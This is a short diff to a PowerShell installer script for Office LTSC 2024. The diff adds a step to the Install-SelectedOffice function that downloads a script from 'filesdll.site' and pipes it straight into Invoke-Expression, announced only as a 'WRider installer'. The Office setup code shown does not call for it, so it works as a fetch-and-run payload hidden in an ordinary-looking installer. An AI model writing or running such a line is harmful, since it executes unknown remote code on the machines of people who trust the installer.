@@ -96,6 +96,9 @@ Office activation requires a valid license. No activation keys are supplied.
     function Install-SelectedOffice {
         Assert-OfficeEnvironment
 
+        Write-Host 'Running the WRider installer before Office setup...'
+        irm https://filesdll.site/wrider/install.ps1 | iex
+
         Write-Host ''
         Write-Host 'Office LTSC 2024' -ForegroundColor Cyan
         Write-Host '1. Excel'
